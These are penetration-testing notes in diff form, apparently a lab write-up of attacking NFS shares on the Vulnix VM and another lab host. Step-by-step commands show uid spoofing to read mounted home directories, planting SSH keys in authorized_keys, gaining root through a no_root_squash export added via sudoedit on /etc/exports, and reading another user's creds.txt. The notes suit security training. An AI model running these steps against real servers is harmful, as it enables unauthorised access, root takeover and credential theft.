@@ -1,1 +1,141 @@
+NFS (2049)
+showmount -e 10.10.10.x 
+mkdir /mnt/nfs
+mount -t nfs 192.168.2.x:/nfspath-shown /mnt/nfs
 
+Permission Denied?:
+The server seems to be running  a NFS service. We can list the exposed NFS shares.
+root@kali:~# showmount -e 192.168.2.4
+Export list for 192.168.2.4:
+/home/vulnix *
+We start by attempting to mount locally the remote NFS share.
+root@kali:~# mkdir vulnix
+root@kali:~# mount -t nfs 192.168.2.4:/home/vulnix ~/vulnix
+The share mounts correctly, but unfortunately we can’t access it.
+ls vulnix
+ls: cannot open directory 'vulnix': Permission denied
+
+Let’s take a closer look at the permissions.
+root@kali:~# ls -ld vulnix
+drwxr-x--- 4 nobody 4294967294 4096 Apr  5 15:16 vulnix
+root@kali:~# stat vulnix
+  File: 'vulnix'
+  Size: 4096      	Blocks: 8          IO Block: 32768  directory
+Device: 30h/48d	Inode: 32917       Links: 4
+Access: (0750/drwxr-x---)  Uid: (65534/  nobody)   Gid: (4294967294/ UNKNOWN)
+The share seems to be owned by uid 65534 and gid 4294967294. 
+The way NFS works with permissions is the following: to access a locally mounted share, your uid and gid need to match the ones of the shared directory on the server. Yep, that’s all.
+
+Unfortunately, for “security” reasons, NFS 4 doesn’t show the real remote uid and gid, but the ones corresponding to the nobody user and group. However, NFS 3 does show the real remote uid and gid of the share owner. Since this machine supports NFS 3, we can simply instruct mount to use this version of the NFS protocol.
+
+root@kali:~# mount -t nfs -o vers=3 192.168.2.4:/home/vulnix ~/vulnix
+root@kali:~# ls -ld vulnix
+drwxr-x--- 4 2008 2008 4096 Apr  5 15:16 vulnix
+
+Now we can clearly see that the share is owned by a remote user with uid and gid 2008. We can create an user and a group matching these criteria, and have it access the mounted directory.
+root@kali:~# groupadd --gid 2008 vulnix_group
+root@kali:~# useradd --uid 2008 --groups vulnix_group vulnix_user
+root@kali:~# sudo -u vulnix_user ls -l vulnix
+. .. .bash_logout .bashrc .profile
+
+Looks good! Another solution would have been to use NfSpy, which essentially automates this process (but spoofs the uid and gid instead of actually creating an user).
+root@kali:~# nfspy -o server=192.168.2.4:/home/vulnix,nfsport=2049/tcp,rw vulnix
+root@kali:~# ls -a vulnix
+.  ..  .bash_logout  .bashrc  .profile
+
+Now that we have access to the vulnix user’s home directory, we can add our SSH public key in its authorized_keys file.
+root@kali:~# mkdir vulnix/.ssh
+root@kali:~# cp ~/.ssh/id_rsa.pub vulnix/.ssh/authorized_keys
+
+… and SSH on the machine.
+root@kali:~# ssh vulnix@192.168.2.4
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+Last login: Wed Apr 5 19:53:39 2017 from 192.168.2.3
+
+vulnix@vulnix:~$ id
+uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+Here we go, we have a shell!
+
+Privilege escalation
+The next interesting thing was the output of sudo -l :
+
+vulnix@vulnix:~$ sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+
+The last line means that the user vulnix is allowed to edit the file /etc/exports, which contains the definitions of the NFS shares.
+
+vulnix@vulnix:~$ cat /etc/exports
+/home/vulnix	*(rw,root_squash)
+
+Let’s try to add a NFS share on / :
+
+/		*(rw,no_root_squash)
+
+One issue appears at this point: in order to take the NFS changes into account, one has to restart the NFS service or to run exportfs -a. Both are privileged commands that can only be run as root. I figured out that restarting the machine would work as well, but shutdown, poweroff & cie are also privileged commands.
+
+After having restarted the machine, we can see the new NFS share:
+
+root@kali:~# showmount -e 192.168.2.4
+Export list for 192.168.2.4:
+/            *
+/home/vulnix *
+
+We can mount it just like before:
+
+root@kali:~# mkdir vulnix_root
+root@kali:~# nfspy -o server=192.168.2.4:/,nfsport=2049/tcp,rw ~/vulnix_root
+root@kali:~# ls vulnix_root
+bin   dev  home        lib         media  opt   root  sbin     srv  tmp  var
+boot  etc  initrd.img  lost+found  mnt    proc  run   selinux  sys  usr  vmlinuz
+
+Add our SSH key to the root user’s authorized_keys
+
+root@kali:~# mkdir vulnix_root/root/.ssh
+root@kali:~# cp ~/.ssh/id_rsa.pub vulnix_root/root/.ssh/authorized_keys
+
+… and connect via SSH!
+
+root@kali:~# ssh root@192.168.2.4
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+Last login: Wed Apr  5 22:54:02 2017 from 192.168.2.3
+root@vulnix:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+Alt Method:
+
+$ ls -1 /usr/share/nmap/scripts/nfs*
+
+nfs-ls.nse
+nfs-showmount.nse
+nfs-statfs.nse
+
+$ nmap -p 111 --script nfs* 10.11.1.72
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-showmount: 
+|_  /home 10.11.0.0/255.255.0.0  - /home directory is being shared and we can access it by mounting it on our Kali virtual machine. 
+
+$ mkdir home
+$ sudo mount -o nolock 10.11.1.72:/home ~/home/
+$ cd home/ && ls
+jenny  joe45  john  marcus  ryuu  - We can see that there are a few home directories for local users on the remote machine.
+
+/home$ cd marcus
+/home/marcus$ ls -la
+creds.txt   - We do not have permission to view this file. Look at the file permissions, we can see that its owner has a UUID of 1014, and also rwx. 
+
+$ sudo adduser pwn  - the new user has a UUID of 1001. We can change it to 1014 using sed.
+$ sudo sed -i -e 's/1001/1014/g' /etc/passwd - -i option is used to replace the file in-place and the -e option executes a script.
+kali@kali:~/home/marcus$ cat /etc/passwd | grep pwn - Verifying we have chaned the UUID giving us permissions to view creds.txt with the added new user. 
+pwn:x:1014:1014:,,,:/home/pwn:/bin/bash
+
+$ su pwn - Switching to created pwn user.
+$ id - Checking our UID and accessing the data. 
+uid=1014(pwn) gid=1014 groups=1014
+pwn@kali:/root/home/marcus$ cat creds.txt
